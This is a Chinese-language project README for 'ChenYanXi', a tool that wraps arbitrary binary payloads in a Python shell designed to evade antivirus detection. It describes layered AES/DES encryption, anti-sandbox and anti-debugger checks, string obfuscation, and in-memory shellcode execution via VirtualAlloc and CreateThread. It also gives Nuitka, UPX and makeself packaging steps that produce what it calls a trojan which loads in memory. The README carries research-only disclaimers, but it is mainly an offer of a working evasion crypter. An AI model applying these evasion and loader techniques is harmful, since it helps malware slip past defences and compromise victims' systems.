
# 🧬 ChenYanXi · 高级多层加密免杀壳生成器

> 👤 作者：**Mingshenhk**
> 🎯 用途：安全研究 / 加壳实验 / 免杀测试
> ⚠️ **免责声明：本工具仅限教学与授权测试，禁止用于任何非法用途！**

---

## 📖 项目概述

**ChenYanXi** 是一个专为安全研究人员与红队测试者设计的高级壳体生成框架，基于 Python 实现，融合多层动态加密、控制流扰乱、虚拟机检测、无文件执行等核心技术。

它可以将任意二进制 Payload（如 `.elf`、`.exe`、shellcode）封装为复杂的 Python 壳体，具备**强抗分析能力、极低查杀率与多平台兼容性**，并可通过 Nuitka 进一步生成高度隐匿的单文件执行程序。

---

## ✨ 功能特性

| 模块                 | 描述                                  |
| ------------------ | ----------------------------------- |
| 🔐 **多层加密 + 压缩**   | 支持最多 8 层 `zlib` + AES/DES 混合加密      |
| 🔑 **动态密钥派生**      | 使用 `PBKDF2-HMAC-SHA256` 加盐密钥衍生，层层不同 |
| 🌀 **控制流伪装**       | 自动插入无害分支，扰乱程序流程分析                   |
| 🔎 **反沙箱 / 反调试**   | 检测 VM、调试器，一旦命中立即退出                  |
| 🧱 **字符串混淆**       | 所有敏感字符串 `chr()` 拼接，躲避特征匹配           |
| 🧬 **内存加载执行**      | 仅加载进 RAM，避免落盘，抗杀软扫描                 |
| 🗂️ **注册表伪驻留（模拟）** | 虚拟添加启动项，无真实写入，迷惑分析器                 |

---

## ⚙️ 技术原理

### 🔐 多层加密逻辑

每层执行如下处理：

1. 原始数据使用 `zlib` 压缩
2. 添加伪装字节干扰特征识别
3. 随机使用 AES 或 DES（CBC）对称加密
4. 加密结果再 Base64 封装

多达 **8 层嵌套式处理**，构建“洋葱壳”，极难逆向。

---

### 🔑 密钥派生设计

每层使用独立密钥与 IV，派生方式：

```python
hashlib.pbkdf2_hmac("sha256", secret, salt, 100000, dklen=32)
```

* `secret` 与 `salt` 均使用 `get_random_bytes()` 生成
* 防止密钥重用与静态模式识别

---

### 🌀 控制流 + 字符串混淆示例

伪装控制流语句：

```python
if random.random() < 0.99:
    pass  # 控制流噪声
```

关键字符串混淆（例如注册表路径）：

```python
reg_key = chr(83)+chr(111)+chr(102)+chr(116)+...
```

---

### 🔍 沙箱 / 调试检测代码

```python
def is_debugged():
    return ctypes.windll.kernel32.IsDebuggerPresent()

def is_vm():
    return any(x in platform.platform().lower() for x in ["vbox", "vmware", "qemu", "sandbox"])
```

如命中检测，立即终止执行。

---

### 🧬 内存加载执行机制（Windows）

```python
ptr = VirtualAlloc(...)
RtlMoveMemory(ptr, payload, ...)
CreateThread(..., ptr, ...)
```

* 全过程运行在内存中
* 不落地文件，避开大多数杀毒检测

---

## 🚀 使用方法

1. 准备一个二进制 Payload（如 shellcode、`.elf`、`.exe`），命名为：

   ```
   shell.elf
   ```

2. 运行壳体生成器：

   ```bash
   ./chenyanxi_linux 
   或者
    chenyanxi_win.exe 
   ```

3. 输出结果为免杀壳体脚本：

   ```
   ultra_shell.py
   ```

---

## 🧰 项目结构

```
chenyanxi/
├── chenyanxi.py           # 主生成器脚本
├── shell.elf              # 示例 Payload（二进制）
├── ultra_shell.py         # 输出带壳 Python 木马
├── image/                 # 截图目录
└── README.md              # 本文档
```
## 🧪 Windows 打包建议（Nuitka）

---

## 🧪 Linux 打包建议（Nuitka + UPX）

安装依赖：

```bash
sudo apt update
sudo apt install patchelf upx makeself
```

使用 Nuitka 打包：

```bash
nuitka --follow-imports --standalone ultra_shell.py
```

压缩主可执行文件：

```bash
strip ultra_shell.dist/ultra_shell.bin
upx -9 ultra_shell.dist/ultra_shell.bin
```

生成单文件运行包：

```bash
sudo apt install makeself
makeself --nox11 ultra_shell.dist/ ultra_shell.run "Ultra Shell Installer" ./ultra_shell.bin
```

最终输出：

```
ultra_shell.run  ← 可直接执行，自动解压 + 加载内存木马
```
结果：

<img src="image/Screenshot 2025-06-24 185736.png" width="600"/>
<img src="image/Screenshot 2025-06-24 185655.png" width="600"/>


或者win和Linux可以使用pyinstaller（不推荐）：

```
pyinstaller --onefile ultra_shell.py
```


<img src="image/Screenshot 2025-06-24 185736.png" width="600"/>
<img src="image/Screenshot 2025-06-24 185656.png" width="600"/>
---

## 📌 注意事项

* 项目依赖：

  ```bash
  pip install pycryptodome
  ```
* 默认针对 Windows 平台（包含 `winreg`, `ctypes.windll`），如用于 Linux 请适配；
* 建议搭配 `pyarmor`、`obfuscator-llvm` 等工具进一步加壳混淆。

---

## 📢 免责声明

> 本项目仅供合法授权测试、教学研究用途。禁止将本工具用于任何非法行为，违者后果自负，作者概不负责！

---

## ⭐ 鸣谢与引用

* [PyCryptodome](https://github.com/Legrandin/pycryptodome) - 高级加密库
* [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
* [Veil Framework](https://github.com/Veil-Framework/Veil)
* APT 内存壳研究文献、逆向与加壳技术研究团队

---

## ❤️ 支持项目

如果你觉得本项目有帮助，请点击 ⭐Star 支持！
欢迎 Fork、提 Issue、提交 PR 一起完善！

---
